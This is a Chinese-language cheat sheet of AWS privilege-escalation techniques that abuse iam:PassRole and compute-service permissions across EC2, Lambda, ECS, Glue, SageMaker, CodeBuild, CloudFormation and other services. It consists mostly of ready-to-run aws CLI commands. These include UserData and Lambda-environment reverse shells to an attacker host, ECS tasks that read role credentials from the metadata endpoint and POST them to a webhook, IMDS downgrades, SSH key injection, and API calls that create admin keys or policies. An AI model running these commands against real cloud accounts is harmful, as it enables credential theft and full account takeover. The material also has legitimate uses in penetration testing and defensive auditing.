# 计算服务提权

本文档覆盖所有基于 `iam:PassRole` + 计算服务创建权限的提权路径。核心模式统一：创建计算资源 → 附加高权限角色 → 在计算资源内执行代码 → 窃取角色凭据。

## EC2 提权

### iam:PassRole + ec2:RunInstances — 启动实例窃取角色

**所需权限**：`iam:PassRole`、`ec2:RunInstances`

通过 SSH 密钥或 UserData 反弹 Shell 访问实例，从元数据服务窃取角色凭据。

```bash
# 方式 1：SSH 密钥访问
aws ec2 run-instances --image-id <ami_id> --instance-type t2.micro \
  --iam-instance-profile Name=<instance_profile> --key-name <ssh_key> \
  --security-group-ids <sg_id>

# 方式 2：UserData 反弹 Shell（无需安全组配置）
cat > /tmp/userdata.sh << 'EOF'
#!/bin/bash
curl https://reverse-shell.sh/<attacker_host>:<port> | bash
EOF

aws ec2 run-instances --image-id <ami_id> --instance-type t2.micro \
  --iam-instance-profile Name=<instance_profile> \
  --user-data file:///tmp/userdata.sh
```

**结果**：提权到实例配置文件关联的角色。

**注意**：从实例外部使用实例角色凭据会触发 GuardDuty 告警。

### iam:PassRole + iam:AddRoleToInstanceProfile — 替换实例角色

**所需权限**：`iam:PassRole`、`iam:AddRoleToInstanceProfile`（可能需要 `iam:RemoveRoleFromInstanceProfile`）

```bash
aws iam remove-role-from-instance-profile --instance-profile-name <profile> --role-name <old_role>
aws iam add-role-to-instance-profile --instance-profile-name <profile> --role-name <high_priv_role>
```

### ec2:ModifyInstanceAttribute — 修改 UserData

**所需权限**：`ec2:ModifyInstanceAttribute`、`ec2:StopInstances`、`ec2:StartInstances`

实例必须停止后才能修改 UserData。

```bash
aws ec2 stop-instances --instance-ids <instance_id>
aws ec2 modify-instance-attribute --instance-id <instance_id> \
  --attribute userData --value file:///tmp/userdata.b64
aws ec2 start-instances --instance-ids <instance_id>
```

### ec2:RequestSpotInstances + iam:PassRole

```bash
REV=$(printf '#!/bin/bash\ncurl https://reverse-shell.sh/<host>:<port> | bash' | base64)
aws ec2 request-spot-instances --instance-count 1 \
  --launch-specification "{\"IamInstanceProfile\":{\"Name\":\"<profile>\"},\"InstanceType\":\"t2.micro\",\"UserData\":\"$REV\",\"ImageId\":\"<ami>\"}"
```

### ec2-instance-connect:SendSSHPublicKey — 注入 SSH 密钥

**所需权限**：`ec2-instance-connect:SendSSHPublicKey`

```bash
aws ec2-instance-connect send-ssh-public-key --instance-id <id> \
  --instance-os-user ec2-user --ssh-public-key file://~/.ssh/id_rsa.pub
```

### ec2:CreateLaunchTemplateVersion — AutoScaler 劫持

**所需权限**：`ec2:CreateLaunchTemplateVersion`、`ec2:ModifyLaunchTemplate`

创建含恶意 UserData 的新版本启动模板，等待 AutoScaler 使用新模板启动实例。

```bash
REV=$(printf '#!/bin/bash\ncurl https://reverse-shell.sh/<host>:<port> | bash' | base64)
aws ec2 create-launch-template-version --launch-template-name <name> \
  --launch-template-data "{\"ImageId\":\"<ami>\",\"InstanceType\":\"t3.micro\",\"IamInstanceProfile\":{\"Name\":\"<profile>\"},\"UserData\":\"$REV\"}"
aws ec2 modify-launch-template --launch-template-name <name> --default-version 2
```

### ec2:ModifyInstanceMetadataOptions — IMDS 降级

**所需权限**：`ec2:ModifyInstanceMetadataOptions`

将 IMDS 从 v2（需 Token）降级为 v1，并提高 Hop Limit，使 SSRF 可达元数据服务。

```bash
aws ec2 modify-instance-metadata-options --instance-id <id> \
  --http-tokens optional --http-put-response-hop-limit 3
```

## Lambda 提权

### iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction

**所需权限**：`iam:PassRole`、`lambda:CreateFunction`、`lambda:InvokeFunction`

最经典的 PassRole 提权路径之一。

```bash
# 创建窃取凭据的 Lambda 代码
cat > /tmp/lambda.py << 'PYEOF'
def handler(event, context):
    import os
    token = open('/proc/self/environ').read()
    return {'statusCode': 200, 'session': token}
PYEOF
cd /tmp && zip lambda.zip lambda.py

# 创建函数并绑定高权限角色
aws lambda create-function --function-name privesc \
  --runtime python3.9 --role <high_priv_role_arn> \
  --handler lambda.lambda_handler --zip-file fileb:///tmp/lambda.zip

# 调用并获取凭据
aws lambda invoke --function-name privesc /tmp/output.txt
cat /tmp/output.txt
```

### lambda:UpdateFunctionCode — 修改已有 Lambda

**所需权限**：`lambda:UpdateFunctionCode`

无需 PassRole，直接修改已有函数代码窃取其角色凭据。

```bash
aws lambda update-function-code --function-name <existing_func> \
  --zip-file fileb:///tmp/backdoor.zip
```

### lambda:UpdateFunctionConfiguration — 环境变量注入 RCE

**所需权限**：`lambda:UpdateFunctionConfiguration`

利用 `PYTHONWARNINGS` + `BROWSER` 环境变量在 Python Lambda 中获取 RCE。

```bash
aws lambda update-function-configuration --function-name <func> \
  --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/<host>/<port> 0>&1' & #%s\"}"
```

也可通过 Lambda Layer 注入恶意代码（覆盖 boto3 等库）。

### iam:PassRole + lambda:CreateFunction + lambda:CreateEventSourceMapping

无需 `lambda:InvokeFunction`，通过 DynamoDB Stream 间接触发 Lambda。

```bash
aws lambda create-event-source-mapping --function-name privesc \
  --event-source-arn <dynamodb_stream_arn> --enabled --starting-position LATEST

# 向 DynamoDB 写入触发
aws dynamodb put-item --table-name <table> --item '{"key":{"S":"trigger"}}'
```

## ECS 提权

### iam:PassRole + ecs:RegisterTaskDefinition + ecs:RunTask

```bash
aws ecs register-task-definition --family privesc \
  --task-role-arn <high_priv_role_arn> --network-mode awsvpc \
  --cpu 256 --memory 512 --requires-compatibilities '["FARGATE"]' \
  --container-definitions '[{"name":"steal","image":"python:latest","entryPoint":["sh","-c"],"command":["curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | curl -X POST -d @- <webhook_url>"]}]'

aws ecs run-task --task-definition privesc --cluster <cluster_arn> \
  --launch-type FARGATE --network-configuration '{"awsvpcConfiguration":{"assignPublicIp":"ENABLED","subnets":["<subnet>"]}}'
```

### iam:PassRole + ecs:RunTask（--overrides 覆盖）

无需注册新任务定义，直接覆盖已有任务的角色和命令。

```bash
aws ecs run-task --cluster <cluster> --task-definition <existing_task:1> \
  --overrides '{"taskRoleArn":"<high_priv_role>","containerOverrides":[{"name":"<container>","command":["sh","-c","curl <webhook>?creds=$(curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)"]}]}'
```

### ecs:ExecuteCommand — 进入运行中容器

**所需权限**：`ecs:ExecuteCommand`、`ecs:DescribeTasks`

```bash
# 检查哪些任务启用了 ExecuteCommand
aws ecs describe-tasks --cluster <cluster> --tasks <task_arn> \
  | grep enableExecuteCommand

aws ecs execute-command --interactive --command "sh" \
  --cluster <cluster> --task <task_arn>

# 容器内窃取凭据
curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
```

## Glue 提权

### iam:PassRole + glue:CreateDevEndpoint — 开发端点

```bash
aws glue create-dev-endpoint --endpoint-name privesc \
  --role-arn <glue_role_arn> --public-key file://~/.ssh/id_rsa.pub

# 等待端点就绪后 SSH 连接
aws glue get-dev-endpoint --endpoint-name privesc
ssh -i ~/.ssh/id_rsa glue@<public_address>
```

### iam:PassRole + glue:CreateJob — Glue Job

```bash
aws glue create-job --name privesc --role <glue_admin_role_arn> \
  --command '{"Name":"pythonshell","PythonVersion":"3","ScriptLocation":"s3://<bucket>/rev.py"}'
aws glue start-job-run --job-name privesc
```

### glue:UpdateDevEndpoint — SSH 密钥替换

```bash
aws glue update-dev-endpoint --endpoint-name <existing> \
  --public-key file://~/.ssh/id_rsa.pub
```

## SageMaker 提权

### iam:PassRole + sagemaker:CreateNotebookInstance

```bash
aws sagemaker create-notebook-instance --notebook-instance-name privesc \
  --instance-type ml.t2.medium \
  --role-arn <sagemaker_role_arn>

# 获取预签名 URL 访问 Jupyter
aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name privesc
# 浏览器打开 URL → Terminal → 窃取凭据
```

### sagemaker:CreatePresignedDomainUrl — Studio 会话劫持

无需 PassRole，为目标 UserProfile 生成登录 URL，继承其 ExecutionRole。

```bash
aws sagemaker create-presigned-domain-url --domain-id <dom_id> \
  --user-profile-name <target_user> --query AuthorizedUrl --output text
```

### iam:PassRole + sagemaker:CreateProcessingJob / CreateTrainingJob

创建处理任务或训练任务执行任意代码，窃取角色凭据。

```bash
aws sagemaker create-processing-job --processing-job-name privesc \
  --processing-resources '{"ClusterConfig":{"InstanceCount":1,"InstanceType":"ml.t3.medium","VolumeSizeInGB":50}}' \
  --app-specification '{"ImageUri":"<sagemaker_image>","ContainerEntrypoint":["python","-c"],"ContainerArguments":["<exfil_code>"]}' \
  --role-arn <role_arn>
```

## CodeBuild 提权

### codebuild:StartBuild — Buildspec 覆盖

**所需权限**：`codebuild:StartBuild`（无需 PassRole 或 UpdateProject）

```bash
cat > /tmp/buildspec.yml << 'EOF'
version: 0.2
phases:
  build:
    commands:
      - curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
EOF
aws codebuild start-build --project-name <project> \
  --buildspec-override file:///tmp/buildspec.yml
```

### iam:PassRole + codebuild:CreateProject

创建新项目绑定高权限角色。

```bash
aws codebuild create-project --name privesc \
  --source '{"type":"NO_SOURCE","buildspec":"version: 0.2\nphases:\n  build:\n    commands:\n      - curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"}' \
  --artifacts '{"type":"NO_ARTIFACTS"}' \
  --environment '{"type":"LINUX_CONTAINER","image":"aws/codebuild/standard:1.0","computeType":"BUILD_GENERAL1_SMALL"}' \
  --service-role <high_priv_role_arn>
aws codebuild start-build --project-name privesc
```

## CloudFormation 提权

### iam:PassRole + cloudformation:CreateStack

```bash
aws cloudformation create-stack --stack-name privesc \
  --template-url https://<attacker_bucket>.s3.amazonaws.com/template.json \
  --role-arn <cf_admin_role_arn> --capabilities CAPABILITY_IAM
```

### cloudformation:UpdateStack（无 PassRole）

利用已附加角色的现有 Stack。

```bash
aws cloudformation update-stack --stack-name <existing_stack> \
  --template-url https://<bucket>.s3.amazonaws.com/malicious-template.json \
  --capabilities CAPABILITY_IAM
```

## 其他计算服务

### EMR — iam:PassRole + elasticmapreduce:RunJobFlow

```bash
aws emr create-cluster --release-label emr-5.15.0 --instance-type m4.large \
  --instance-count 1 --service-role EMR_DefaultRole \
  --ec2-attributes InstanceProfile=<ec2_role>,KeyName=<ssh_key>
```

### CodePipeline — iam:PassRole + codepipeline:CreatePipeline

创建流水线指定高权限服务角色，在构建阶段执行命令。

### CodeStar — codestar:CreateProject + codestar:AssociateTeamMember

通过 CodeStar 项目获取额外策略和 CloudFormation 角色。

### Elastic Beanstalk — S3 写入 + elasticbeanstalk:RebuildEnvironment

修改 Beanstalk S3 桶中的代码包后重建环境。

### AppRunner — iam:PassRole + apprunner:CreateService

```bash
aws apprunner create-service --service-name privesc \
  --source-configuration '{"ImageRepository":{"ImageIdentifier":"<image>","ImageRepositoryType":"ECR_PUBLIC","ImageConfiguration":{"Port":"3000"}}}' \
  --instance-configuration '{"InstanceRoleArn":"<role_arn>"}'
```

### Step Functions — states:TestState + iam:PassRole

无需创建状态机，直接测试单个状态执行 API 调用。

```bash
aws stepfunctions test-state \
  --definition '{"Type":"Task","Parameters":{"UserName":"admin"},"Resource":"arn:aws:states:::aws-sdk:iam:createAccessKey","End":true}' \
  --role-arn <permissive_role_arn>
```

### DataPipeline — iam:PassRole + datapipeline:CreatePipeline

创建管道通过 ShellCommandActivity 执行命令。

### EventBridge Scheduler — iam:PassRole + scheduler:CreateSchedule

利用通用目标（Universal Target）调用任意 AWS API。

```bash
aws scheduler create-schedule --name privesc \
  --schedule-expression "rate(5 minutes)" --flexible-time-window "Mode=OFF" \
  --target '{"Arn":"arn:aws:scheduler:::aws-sdk:iam:putRolePolicy","RoleArn":"<role_with_putpolicy>","Input":"{\"RoleName\":\"<target>\",\"PolicyName\":\"admin\",\"PolicyDocument\":\"{\\\"Version\\\":\\\"2012-10-17\\\",\\\"Statement\\\":[{\\\"Effect\\\":\\\"Allow\\\",\\\"Action\\\":\\\"*\\\",\\\"Resource\\\":\\\"*\\\"}]}\"}"}'
```
